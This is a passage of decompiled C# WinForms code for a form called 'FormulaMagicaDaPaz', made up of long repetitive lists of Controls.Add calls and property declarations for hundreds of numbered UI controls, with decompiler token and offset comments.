			base.Controls.Add(this.ComboBox21);
			base.Controls.Add(this.Button21);
			base.Controls.Add(this.CheckedListBox32);
			base.Controls.Add(this.ComboBox22);
			base.Controls.Add(this.MonthCalendar22);
			base.Controls.Add(this.MonthCalendar23);
			base.Controls.Add(this.LinkLabel32);
			base.Controls.Add(this.ProgressBar44);
			base.Controls.Add(this.LinkLabel33);
			base.Controls.Add(this.ListBox33);
			base.Controls.Add(this.CheckBox22);
			base.Controls.Add(this.CheckedListBox33);
			base.Controls.Add(this.Button22);
			base.Controls.Add(this.ProgressBar45);
			base.Controls.Add(this.ProgressBar46);
			base.Controls.Add(this.DateTimePicker23);
			base.Controls.Add(this.CheckedListBox34);
			base.Controls.Add(this.ListBox34);
			base.Controls.Add(this.DateTimePicker24);
			base.Controls.Add(this.ListBox35);
			base.Controls.Add(this.Label12);
			base.Controls.Add(this.MaskedTextBox23);
			base.Controls.Add(this.RadioButton23);
			base.Controls.Add(this.PictureBox23);
			base.Controls.Add(this.MaskedTextBox24);
			base.Controls.Add(this.WebBrowser12);
			base.Controls.Add(this.TreeView12);
			base.Controls.Add(this.PictureBox24);
			base.Controls.Add(this.NumericUpDown12);
			base.Controls.Add(this.ProgressBar47);
			base.Controls.Add(this.RadioButton24);
			base.Controls.Add(this.LinkLabel34);
			base.Controls.Add(this.CheckBox23);
			base.Controls.Add(this.ComboBox23);
			base.Controls.Add(this.Button23);
			base.Controls.Add(this.CheckedListBox35);
			base.Controls.Add(this.ComboBox24);
			base.Controls.Add(this.MonthCalendar24);
			base.Controls.Add(this.MonthCalendar25);
			base.Controls.Add(this.LinkLabel35);
			base.Controls.Add(this.ProgressBar48);
			base.Controls.Add(this.MonthCalendar26);
			base.Controls.Add(this.LinkLabel36);
			base.Controls.Add(this.ListBox36);
			base.Controls.Add(this.CheckBox24);
			base.Controls.Add(this.CheckedListBox36);
			base.Controls.Add(this.Button24);
			base.Controls.Add(this.ProgressBar21);
			base.Controls.Add(this.ProgressBar22);
			base.Controls.Add(this.DateTimePicker11);
			base.Controls.Add(this.CheckedListBox16);
			base.Controls.Add(this.ListBox16);
			base.Controls.Add(this.DateTimePicker12);
			base.Controls.Add(this.ListBox17);
			base.Controls.Add(this.Label6);
			base.Controls.Add(this.MaskedTextBox11);
			base.Controls.Add(this.RadioButton11);
			base.Controls.Add(this.PictureBox11);
			base.Controls.Add(this.MaskedTextBox12);
			base.Controls.Add(this.WebBrowser6);
			base.Controls.Add(this.TreeView6);
			base.Controls.Add(this.PictureBox12);
			base.Controls.Add(this.NumericUpDown6);
			base.Controls.Add(this.ProgressBar23);
			base.Controls.Add(this.RadioButton12);
			base.Controls.Add(this.LinkLabel16);
			base.Controls.Add(this.CheckBox11);
			base.Controls.Add(this.ComboBox11);
			base.Controls.Add(this.Button11);
			base.Controls.Add(this.CheckedListBox17);
			base.Controls.Add(this.ComboBox12);
			base.Controls.Add(this.MonthCalendar12);
			base.Controls.Add(this.MonthCalendar13);
			base.Controls.Add(this.LinkLabel17);
			base.Controls.Add(this.ProgressBar24);
			base.Controls.Add(this.LinkLabel18);
			base.Controls.Add(this.ListBox18);
			base.Controls.Add(this.CheckBox12);
			base.Controls.Add(this.CheckedListBox18);
			base.Controls.Add(this.Button12);
			base.Controls.Add(this.ProgressBar17);
			base.Controls.Add(this.ProgressBar18);
			base.Controls.Add(this.DateTimePicker9);
			base.Controls.Add(this.CheckedListBox13);
			base.Controls.Add(this.ListBox13);
			base.Controls.Add(this.DateTimePicker10);
			base.Controls.Add(this.ListBox14);
			base.Controls.Add(this.Label5);
			base.Controls.Add(this.MaskedTextBox9);
			base.Controls.Add(this.RadioButton9);
			base.Controls.Add(this.PictureBox9);
			base.Controls.Add(this.MaskedTextBox10);
			base.Controls.Add(this.WebBrowser5);
			base.Controls.Add(this.TreeView5);
			base.Controls.Add(this.PictureBox10);
			base.Controls.Add(this.NumericUpDown5);
			base.Controls.Add(this.ProgressBar19);
			base.Controls.Add(this.RadioButton10);
			base.Controls.Add(this.LinkLabel13);
			base.Controls.Add(this.CheckBox9);
			base.Controls.Add(this.ComboBox9);
			base.Controls.Add(this.Button9);
			base.Controls.Add(this.CheckedListBox14);
			base.Controls.Add(this.ComboBox10);
			base.Controls.Add(this.MonthCalendar10);
			base.Controls.Add(this.MonthCalendar11);
			base.Controls.Add(this.LinkLabel14);
			base.Controls.Add(this.ProgressBar20);
			base.Controls.Add(this.LinkLabel15);
			base.Controls.Add(this.ListBox15);
			base.Controls.Add(this.CheckBox10);
			base.Controls.Add(this.CheckedListBox15);
			base.Controls.Add(this.Button10);
			base.Controls.Add(this.ProgressBar13);
			base.Controls.Add(this.ProgressBar14);
			base.Controls.Add(this.DateTimePicker7);
			base.Controls.Add(this.CheckedListBox10);
			base.Controls.Add(this.ListBox10);
			base.Controls.Add(this.DateTimePicker8);
			base.Controls.Add(this.ListBox11);
			base.Controls.Add(this.Label4);
			base.Controls.Add(this.MaskedTextBox7);
			base.Controls.Add(this.RadioButton7);
			base.Controls.Add(this.PictureBox7);
			base.Controls.Add(this.MaskedTextBox8);
			base.Controls.Add(this.WebBrowser4);
			base.Controls.Add(this.TreeView4);
			base.Controls.Add(this.PictureBox8);
			base.Controls.Add(this.NumericUpDown4);
			base.Controls.Add(this.ProgressBar15);
			base.Controls.Add(this.RadioButton8);
			base.Controls.Add(this.LinkLabel10);
			base.Controls.Add(this.CheckBox7);
			base.Controls.Add(this.ComboBox7);
			base.Controls.Add(this.Button7);
			base.Controls.Add(this.CheckedListBox11);
			base.Controls.Add(this.ComboBox8);
			base.Controls.Add(this.MonthCalendar8);
			base.Controls.Add(this.MonthCalendar9);
			base.Controls.Add(this.LinkLabel11);
			base.Controls.Add(this.ProgressBar16);
			base.Controls.Add(this.LinkLabel12);
			base.Controls.Add(this.ListBox12);
			base.Controls.Add(this.CheckBox8);
			base.Controls.Add(this.CheckedListBox12);
			base.Controls.Add(this.Button8);
			base.Controls.Add(this.ProgressBar9);
			base.Controls.Add(this.ProgressBar10);
			base.Controls.Add(this.DateTimePicker5);
			base.Controls.Add(this.CheckedListBox7);
			base.Controls.Add(this.ListBox7);
			base.Controls.Add(this.DateTimePicker6);
			base.Controls.Add(this.ListBox8);
			base.Controls.Add(this.Label3);
			base.Controls.Add(this.MaskedTextBox5);
			base.Controls.Add(this.RadioButton5);
			base.Controls.Add(this.PictureBox5);
			base.Controls.Add(this.MaskedTextBox6);
			base.Controls.Add(this.WebBrowser3);
			base.Controls.Add(this.TreeView3);
			base.Controls.Add(this.PictureBox6);
			base.Controls.Add(this.NumericUpDown3);
			base.Controls.Add(this.ProgressBar11);
			base.Controls.Add(this.RadioButton6);
			base.Controls.Add(this.LinkLabel7);
			base.Controls.Add(this.CheckBox5);
			base.Controls.Add(this.ComboBox5);
			base.Controls.Add(this.Button5);
			base.Controls.Add(this.CheckedListBox8);
			base.Controls.Add(this.ComboBox6);
			base.Controls.Add(this.MonthCalendar6);
			base.Controls.Add(this.MonthCalendar7);
			base.Controls.Add(this.LinkLabel8);
			base.Controls.Add(this.ProgressBar12);
			base.Controls.Add(this.LinkLabel9);
			base.Controls.Add(this.ListBox9);
			base.Controls.Add(this.CheckBox6);
			base.Controls.Add(this.CheckedListBox9);
			base.Controls.Add(this.Button6);
			base.Controls.Add(this.ProgressBar5);
			base.Controls.Add(this.ProgressBar6);
			base.Controls.Add(this.DateTimePicker3);
			base.Controls.Add(this.CheckedListBox4);
			base.Controls.Add(this.ListBox4);
			base.Controls.Add(this.DateTimePicker4);
			base.Controls.Add(this.ListBox5);
			base.Controls.Add(this.Label2);
			base.Controls.Add(this.MaskedTextBox3);
			base.Controls.Add(this.RadioButton3);
			base.Controls.Add(this.PictureBox3);
			base.Controls.Add(this.MaskedTextBox4);
			base.Controls.Add(this.WebBrowser2);
			base.Controls.Add(this.TreeView2);
			base.Controls.Add(this.PictureBox4);
			base.Controls.Add(this.NumericUpDown2);
			base.Controls.Add(this.ProgressBar7);
			base.Controls.Add(this.RadioButton4);
			base.Controls.Add(this.LinkLabel4);
			base.Controls.Add(this.CheckBox3);
			base.Controls.Add(this.ComboBox3);
			base.Controls.Add(this.Button3);
			base.Controls.Add(this.CheckedListBox5);
			base.Controls.Add(this.ComboBox4);
			base.Controls.Add(this.MonthCalendar4);
			base.Controls.Add(this.MonthCalendar5);
			base.Controls.Add(this.LinkLabel5);
			base.Controls.Add(this.ProgressBar8);
			base.Controls.Add(this.LinkLabel6);
			base.Controls.Add(this.ListBox6);
			base.Controls.Add(this.CheckBox4);
			base.Controls.Add(this.CheckedListBox6);
			base.Controls.Add(this.Button4);
			base.Controls.Add(this.ProgressBar4);
			base.Controls.Add(this.ProgressBar3);
			base.Controls.Add(this.DateTimePicker2);
			base.Controls.Add(this.CheckedListBox3);
			base.Controls.Add(this.ListBox3);
			base.Controls.Add(this.DateTimePicker1);
			base.Controls.Add(this.ListBox2);
			base.Controls.Add(this.Label1);
			base.Controls.Add(this.MaskedTextBox2);
			base.Controls.Add(this.RadioButton2);
			base.Controls.Add(this.PictureBox2);
			base.Controls.Add(this.MaskedTextBox1);
			base.Controls.Add(this.WebBrowser1);
			base.Controls.Add(this.TreeView1);
			base.Controls.Add(this.PictureBox1);
			base.Controls.Add(this.NumericUpDown1);
			base.Controls.Add(this.ProgressBar2);
			base.Controls.Add(this.RadioButton1);
			base.Controls.Add(this.LinkLabel3);
			base.Controls.Add(this.CheckBox2);
			base.Controls.Add(this.ComboBox2);
			base.Controls.Add(this.Button2);
			base.Controls.Add(this.CheckedListBox2);
			base.Controls.Add(this.ComboBox1);
			base.Controls.Add(this.MonthCalendar3);
			base.Controls.Add(this.MonthCalendar2);
			base.Controls.Add(this.LinkLabel2);
			base.Controls.Add(this.ProgressBar1);
			base.Controls.Add(this.MonthCalendar1);
			base.Controls.Add(this.LinkLabel1);
			base.Controls.Add(this.ListBox1);
			base.Controls.Add(this.CheckBox1);
			base.Controls.Add(this.CheckedListBox1);
			base.Controls.Add(this.Button1);
			base.Name = "FormulaMagicaDaPaz";
			this.Text = "FormulaMagicaDaPaz";
			((ISupportInitialize)this.NumericUpDown1).EndInit();
			((ISupportInitialize)this.PictureBox1).EndInit();
			((ISupportInitialize)this.PictureBox2).EndInit();
			((ISupportInitialize)this.PictureBox3).EndInit();
			((ISupportInitialize)this.PictureBox4).EndInit();
			((ISupportInitialize)this.NumericUpDown2).EndInit();
			((ISupportInitialize)this.PictureBox5).EndInit();
			((ISupportInitialize)this.PictureBox6).EndInit();
			((ISupportInitialize)this.NumericUpDown3).EndInit();
			((ISupportInitialize)this.PictureBox7).EndInit();
			((ISupportInitialize)this.PictureBox8).EndInit();
			((ISupportInitialize)this.NumericUpDown4).EndInit();
			((ISupportInitialize)this.PictureBox9).EndInit();
			((ISupportInitialize)this.PictureBox10).EndInit();
			((ISupportInitialize)this.NumericUpDown5).EndInit();
			((ISupportInitialize)this.PictureBox11).EndInit();
			((ISupportInitialize)this.PictureBox12).EndInit();
			((ISupportInitialize)this.NumericUpDown6).EndInit();
			((ISupportInitialize)this.PictureBox13).EndInit();
			((ISupportInitialize)this.PictureBox14).EndInit();
			((ISupportInitialize)this.NumericUpDown7).EndInit();
			((ISupportInitialize)this.PictureBox15).EndInit();
			((ISupportInitialize)this.PictureBox16).EndInit();
			((ISupportInitialize)this.NumericUpDown8).EndInit();
			((ISupportInitialize)this.PictureBox17).EndInit();
			((ISupportInitialize)this.PictureBox18).EndInit();
			((ISupportInitialize)this.NumericUpDown9).EndInit();
			((ISupportInitialize)this.PictureBox19).EndInit();
			((ISupportInitialize)this.PictureBox20).EndInit();
			((ISupportInitialize)this.NumericUpDown10).EndInit();
			((ISupportInitialize)this.PictureBox21).EndInit();
			((ISupportInitialize)this.PictureBox22).EndInit();
			((ISupportInitialize)this.NumericUpDown11).EndInit();
			((ISupportInitialize)this.PictureBox23).EndInit();
			((ISupportInitialize)this.PictureBox24).EndInit();
			((ISupportInitialize)this.NumericUpDown12).EndInit();
			((ISupportInitialize)this.PictureBox25).EndInit();
			((ISupportInitialize)this.PictureBox26).EndInit();
			((ISupportInitialize)this.NumericUpDown13).EndInit();
			((ISupportInitialize)this.PictureBox27).EndInit();
			((ISupportInitialize)this.PictureBox28).EndInit();
			((ISupportInitialize)this.NumericUpDown14).EndInit();
			((ISupportInitialize)this.PictureBox29).EndInit();
			((ISupportInitialize)this.PictureBox30).EndInit();
			((ISupportInitialize)this.NumericUpDown15).EndInit();
			((ISupportInitialize)this.PictureBox31).EndInit();
			((ISupportInitialize)this.PictureBox32).EndInit();
			((ISupportInitialize)this.NumericUpDown16).EndInit();
			((ISupportInitialize)this.PictureBox33).EndInit();
			((ISupportInitialize)this.PictureBox34).EndInit();
			((ISupportInitialize)this.NumericUpDown17).EndInit();
			((ISupportInitialize)this.PictureBox35).EndInit();
			((ISupportInitialize)this.PictureBox36).EndInit();
			((ISupportInitialize)this.NumericUpDown18).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x1700020E RID: 526
		// (get) Token: 0x06000437 RID: 1079 RVA: 0x00026749 File Offset: 0x00024949
		// (set) Token: 0x06000438 RID: 1080 RVA: 0x00026751 File Offset: 0x00024951
		internal virtual Button Button1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700020F RID: 527
		// (get) Token: 0x06000439 RID: 1081 RVA: 0x0002675A File Offset: 0x0002495A
		// (set) Token: 0x0600043A RID: 1082 RVA: 0x00026762 File Offset: 0x00024962
		internal virtual CheckedListBox CheckedListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000210 RID: 528
		// (get) Token: 0x0600043B RID: 1083 RVA: 0x0002676B File Offset: 0x0002496B
		// (set) Token: 0x0600043C RID: 1084 RVA: 0x00026773 File Offset: 0x00024973
		internal virtual CheckBox CheckBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000211 RID: 529
		// (get) Token: 0x0600043D RID: 1085 RVA: 0x0002677C File Offset: 0x0002497C
		// (set) Token: 0x0600043E RID: 1086 RVA: 0x00026784 File Offset: 0x00024984
		internal virtual ListBox ListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000212 RID: 530
		// (get) Token: 0x0600043F RID: 1087 RVA: 0x0002678D File Offset: 0x0002498D
		// (set) Token: 0x06000440 RID: 1088 RVA: 0x00026795 File Offset: 0x00024995
		internal virtual LinkLabel LinkLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000213 RID: 531
		// (get) Token: 0x06000441 RID: 1089 RVA: 0x0002679E File Offset: 0x0002499E
		// (set) Token: 0x06000442 RID: 1090 RVA: 0x000267A6 File Offset: 0x000249A6
		internal virtual MonthCalendar MonthCalendar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000214 RID: 532
		// (get) Token: 0x06000443 RID: 1091 RVA: 0x000267AF File Offset: 0x000249AF
		// (set) Token: 0x06000444 RID: 1092 RVA: 0x000267B7 File Offset: 0x000249B7
		internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000215 RID: 533
		// (get) Token: 0x06000445 RID: 1093 RVA: 0x000267C0 File Offset: 0x000249C0
		// (set) Token: 0x06000446 RID: 1094 RVA: 0x000267C8 File Offset: 0x000249C8
		internal virtual LinkLabel LinkLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000216 RID: 534
		// (get) Token: 0x06000447 RID: 1095 RVA: 0x000267D1 File Offset: 0x000249D1
		// (set) Token: 0x06000448 RID: 1096 RVA: 0x000267D9 File Offset: 0x000249D9
		internal virtual NotifyIcon NotifyIcon1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000217 RID: 535
		// (get) Token: 0x06000449 RID: 1097 RVA: 0x000267E2 File Offset: 0x000249E2
		// (set) Token: 0x0600044A RID: 1098 RVA: 0x000267EA File Offset: 0x000249EA
		internal virtual MonthCalendar MonthCalendar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000218 RID: 536
		// (get) Token: 0x0600044B RID: 1099 RVA: 0x000267F3 File Offset: 0x000249F3
		// (set) Token: 0x0600044C RID: 1100 RVA: 0x000267FB File Offset: 0x000249FB
		internal virtual MonthCalendar MonthCalendar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000219 RID: 537
		// (get) Token: 0x0600044D RID: 1101 RVA: 0x00026804 File Offset: 0x00024A04
		// (set) Token: 0x0600044E RID: 1102 RVA: 0x0002680C File Offset: 0x00024A0C
		internal virtual ComboBox ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700021A RID: 538
		// (get) Token: 0x0600044F RID: 1103 RVA: 0x00026815 File Offset: 0x00024A15
		// (set) Token: 0x06000450 RID: 1104 RVA: 0x0002681D File Offset: 0x00024A1D
		internal virtual CheckedListBox CheckedListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700021B RID: 539
		// (get) Token: 0x06000451 RID: 1105 RVA: 0x00026826 File Offset: 0x00024A26
		// (set) Token: 0x06000452 RID: 1106 RVA: 0x0002682E File Offset: 0x00024A2E
		internal virtual Button Button2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700021C RID: 540
		// (get) Token: 0x06000453 RID: 1107 RVA: 0x00026837 File Offset: 0x00024A37
		// (set) Token: 0x06000454 RID: 1108 RVA: 0x0002683F File Offset: 0x00024A3F
		internal virtual ComboBox ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700021D RID: 541
		// (get) Token: 0x06000455 RID: 1109 RVA: 0x00026848 File Offset: 0x00024A48
		// (set) Token: 0x06000456 RID: 1110 RVA: 0x00026850 File Offset: 0x00024A50
		internal virtual CheckBox CheckBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700021E RID: 542
		// (get) Token: 0x06000457 RID: 1111 RVA: 0x00026859 File Offset: 0x00024A59
		// (set) Token: 0x06000458 RID: 1112 RVA: 0x00026861 File Offset: 0x00024A61
		internal virtual LinkLabel LinkLabel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700021F RID: 543
		// (get) Token: 0x06000459 RID: 1113 RVA: 0x0002686A File Offset: 0x00024A6A
		// (set) Token: 0x0600045A RID: 1114 RVA: 0x00026872 File Offset: 0x00024A72
		internal virtual RadioButton RadioButton1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000220 RID: 544
		// (get) Token: 0x0600045B RID: 1115 RVA: 0x0002687B File Offset: 0x00024A7B
		// (set) Token: 0x0600045C RID: 1116 RVA: 0x00026883 File Offset: 0x00024A83
		internal virtual ProgressBar ProgressBar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000221 RID: 545
		// (get) Token: 0x0600045D RID: 1117 RVA: 0x0002688C File Offset: 0x00024A8C
		// (set) Token: 0x0600045E RID: 1118 RVA: 0x00026894 File Offset: 0x00024A94
		internal virtual NumericUpDown NumericUpDown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000222 RID: 546
		// (get) Token: 0x0600045F RID: 1119 RVA: 0x0002689D File Offset: 0x00024A9D
		// (set) Token: 0x06000460 RID: 1120 RVA: 0x000268A5 File Offset: 0x00024AA5
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000223 RID: 547
		// (get) Token: 0x06000461 RID: 1121 RVA: 0x000268AE File Offset: 0x00024AAE
		// (set) Token: 0x06000462 RID: 1122 RVA: 0x000268B6 File Offset: 0x00024AB6
		internal virtual ToolTip ToolTip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000224 RID: 548
		// (get) Token: 0x06000463 RID: 1123 RVA: 0x000268BF File Offset: 0x00024ABF
		// (set) Token: 0x06000464 RID: 1124 RVA: 0x000268C7 File Offset: 0x00024AC7
		internal virtual TreeView TreeView1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000225 RID: 549
		// (get) Token: 0x06000465 RID: 1125 RVA: 0x000268D0 File Offset: 0x00024AD0
		// (set) Token: 0x06000466 RID: 1126 RVA: 0x000268D8 File Offset: 0x00024AD8
		internal virtual WebBrowser WebBrowser1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000226 RID: 550
		// (get) Token: 0x06000467 RID: 1127 RVA: 0x000268E1 File Offset: 0x00024AE1
		// (set) Token: 0x06000468 RID: 1128 RVA: 0x000268E9 File Offset: 0x00024AE9
		internal virtual MaskedTextBox MaskedTextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000227 RID: 551
		// (get) Token: 0x06000469 RID: 1129 RVA: 0x000268F2 File Offset: 0x00024AF2
		// (set) Token: 0x0600046A RID: 1130 RVA: 0x000268FA File Offset: 0x00024AFA
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000228 RID: 552
		// (get) Token: 0x0600046B RID: 1131 RVA: 0x00026903 File Offset: 0x00024B03
		// (set) Token: 0x0600046C RID: 1132 RVA: 0x0002690B File Offset: 0x00024B0B
		internal virtual RadioButton RadioButton2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000229 RID: 553
		// (get) Token: 0x0600046D RID: 1133 RVA: 0x00026914 File Offset: 0x00024B14
		// (set) Token: 0x0600046E RID: 1134 RVA: 0x0002691C File Offset: 0x00024B1C
		internal virtual MaskedTextBox MaskedTextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700022A RID: 554
		// (get) Token: 0x0600046F RID: 1135 RVA: 0x00026925 File Offset: 0x00024B25
		// (set) Token: 0x06000470 RID: 1136 RVA: 0x0002692D File Offset: 0x00024B2D
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700022B RID: 555
		// (get) Token: 0x06000471 RID: 1137 RVA: 0x00026936 File Offset: 0x00024B36
		// (set) Token: 0x06000472 RID: 1138 RVA: 0x0002693E File Offset: 0x00024B3E
		internal virtual ListBox ListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700022C RID: 556
		// (get) Token: 0x06000473 RID: 1139 RVA: 0x00026947 File Offset: 0x00024B47
		// (set) Token: 0x06000474 RID: 1140 RVA: 0x0002694F File Offset: 0x00024B4F
		internal virtual DateTimePicker DateTimePicker1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700022D RID: 557
		// (get) Token: 0x06000475 RID: 1141 RVA: 0x00026958 File Offset: 0x00024B58
		// (set) Token: 0x06000476 RID: 1142 RVA: 0x00026960 File Offset: 0x00024B60
		internal virtual ListBox ListBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700022E RID: 558
		// (get) Token: 0x06000477 RID: 1143 RVA: 0x00026969 File Offset: 0x00024B69
		// (set) Token: 0x06000478 RID: 1144 RVA: 0x00026971 File Offset: 0x00024B71
		internal virtual CheckedListBox CheckedListBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700022F RID: 559
		// (get) Token: 0x06000479 RID: 1145 RVA: 0x0002697A File Offset: 0x00024B7A
		// (set) Token: 0x0600047A RID: 1146 RVA: 0x00026982 File Offset: 0x00024B82
		internal virtual DateTimePicker DateTimePicker2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000230 RID: 560
		// (get) Token: 0x0600047B RID: 1147 RVA: 0x0002698B File Offset: 0x00024B8B
		// (set) Token: 0x0600047C RID: 1148 RVA: 0x00026993 File Offset: 0x00024B93
		internal virtual ProgressBar ProgressBar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000231 RID: 561
		// (get) Token: 0x0600047D RID: 1149 RVA: 0x0002699C File Offset: 0x00024B9C
		// (set) Token: 0x0600047E RID: 1150 RVA: 0x000269A4 File Offset: 0x00024BA4
		internal virtual ProgressBar ProgressBar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000232 RID: 562
		// (get) Token: 0x0600047F RID: 1151 RVA: 0x000269AD File Offset: 0x00024BAD
		// (set) Token: 0x06000480 RID: 1152 RVA: 0x000269B5 File Offset: 0x00024BB5
		internal virtual ProgressBar ProgressBar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000233 RID: 563
		// (get) Token: 0x06000481 RID: 1153 RVA: 0x000269BE File Offset: 0x00024BBE
		// (set) Token: 0x06000482 RID: 1154 RVA: 0x000269C6 File Offset: 0x00024BC6
		internal virtual ProgressBar ProgressBar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000234 RID: 564
		// (get) Token: 0x06000483 RID: 1155 RVA: 0x000269CF File Offset: 0x00024BCF
		// (set) Token: 0x06000484 RID: 1156 RVA: 0x000269D7 File Offset: 0x00024BD7
		internal virtual DateTimePicker DateTimePicker3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000235 RID: 565
		// (get) Token: 0x06000485 RID: 1157 RVA: 0x000269E0 File Offset: 0x00024BE0
		// (set) Token: 0x06000486 RID: 1158 RVA: 0x000269E8 File Offset: 0x00024BE8
		internal virtual CheckedListBox CheckedListBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000236 RID: 566
		// (get) Token: 0x06000487 RID: 1159 RVA: 0x000269F1 File Offset: 0x00024BF1
		// (set) Token: 0x06000488 RID: 1160 RVA: 0x000269F9 File Offset: 0x00024BF9
		internal virtual ListBox ListBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000237 RID: 567
		// (get) Token: 0x06000489 RID: 1161 RVA: 0x00026A02 File Offset: 0x00024C02
		// (set) Token: 0x0600048A RID: 1162 RVA: 0x00026A0A File Offset: 0x00024C0A
		internal virtual DateTimePicker DateTimePicker4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000238 RID: 568
		// (get) Token: 0x0600048B RID: 1163 RVA: 0x00026A13 File Offset: 0x00024C13
		// (set) Token: 0x0600048C RID: 1164 RVA: 0x00026A1B File Offset: 0x00024C1B
		internal virtual ListBox ListBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000239 RID: 569
		// (get) Token: 0x0600048D RID: 1165 RVA: 0x00026A24 File Offset: 0x00024C24
		// (set) Token: 0x0600048E RID: 1166 RVA: 0x00026A2C File Offset: 0x00024C2C
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023A RID: 570
		// (get) Token: 0x0600048F RID: 1167 RVA: 0x00026A35 File Offset: 0x00024C35
		// (set) Token: 0x06000490 RID: 1168 RVA: 0x00026A3D File Offset: 0x00024C3D
		internal virtual MaskedTextBox MaskedTextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023B RID: 571
		// (get) Token: 0x06000491 RID: 1169 RVA: 0x00026A46 File Offset: 0x00024C46
		// (set) Token: 0x06000492 RID: 1170 RVA: 0x00026A4E File Offset: 0x00024C4E
		internal virtual RadioButton RadioButton3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023C RID: 572
		// (get) Token: 0x06000493 RID: 1171 RVA: 0x00026A57 File Offset: 0x00024C57
		// (set) Token: 0x06000494 RID: 1172 RVA: 0x00026A5F File Offset: 0x00024C5F
		internal virtual PictureBox PictureBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023D RID: 573
		// (get) Token: 0x06000495 RID: 1173 RVA: 0x00026A68 File Offset: 0x00024C68
		// (set) Token: 0x06000496 RID: 1174 RVA: 0x00026A70 File Offset: 0x00024C70
		internal virtual MaskedTextBox MaskedTextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023E RID: 574
		// (get) Token: 0x06000497 RID: 1175 RVA: 0x00026A79 File Offset: 0x00024C79
		// (set) Token: 0x06000498 RID: 1176 RVA: 0x00026A81 File Offset: 0x00024C81
		internal virtual WebBrowser WebBrowser2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023F RID: 575
		// (get) Token: 0x06000499 RID: 1177 RVA: 0x00026A8A File Offset: 0x00024C8A
		// (set) Token: 0x0600049A RID: 1178 RVA: 0x00026A92 File Offset: 0x00024C92
		internal virtual TreeView TreeView2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000240 RID: 576
		// (get) Token: 0x0600049B RID: 1179 RVA: 0x00026A9B File Offset: 0x00024C9B
		// (set) Token: 0x0600049C RID: 1180 RVA: 0x00026AA3 File Offset: 0x00024CA3
		internal virtual PictureBox PictureBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000241 RID: 577
		// (get) Token: 0x0600049D RID: 1181 RVA: 0x00026AAC File Offset: 0x00024CAC
		// (set) Token: 0x0600049E RID: 1182 RVA: 0x00026AB4 File Offset: 0x00024CB4
		internal virtual NumericUpDown NumericUpDown2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000242 RID: 578
